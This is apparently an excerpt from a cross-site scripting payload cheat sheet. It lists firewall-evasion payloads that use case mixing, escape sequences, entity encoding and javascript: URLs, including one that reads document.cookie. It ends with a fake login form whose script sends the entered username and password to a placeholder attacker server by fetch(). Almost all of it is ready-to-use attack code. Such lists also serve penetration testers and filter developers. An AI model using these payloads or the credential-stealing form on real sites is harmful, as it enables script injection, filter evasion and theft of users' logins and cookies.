### WAF bypass
```
<sCriPt>alert``</sCRipT>
<sCriPt>eval('alert\x280\x29');</sCRipT>
<sCriPt>setTimeout('alert\x280\x29',0);</sCRipT>
<sCriPt>Function('alert\x280\x29')();</sCRipT>
<sCriPt>window.location='javascript:alert(0)';</sCRipT>
<iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
<iNpUt type=im&#x000000000000000000000000000000061;ge &gt; id="x"oNerRor="window['\a\l\ert']()" src />
<iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
<iNpUt x="&quot; /> " id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt x="&#x22; /> " id=""onfocus="window['\a\l\ert']()" autofocus/> 
<iNpUt x='&#39; /> ' id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
<iMG src &gt; onerror="alert&#x000000028;&#x29;" />
<iMG src onload=%ff%00%ffAAA onerror=alert() />
<iMG onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
<oBjECt data="javascript:window['\a\l\ert']()" />
<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">REDIRECT TO LOGIN</a>
```

### Fake authentication form sending credentials to remote server

    <input type="text" name="username" id="username" /><input type="password" name="password" id="password" /><script>function sleep(ms){return new Promise(r => setTimeout(r,ms));}sleep(3000).then(()=> {var user =document.getElementById('username').value;var pass = document.getElementById('password').value;var user_pass = user+"_"+pass;fetch("https://[YOUR_SERVER]?u="+user_pass);});</script>
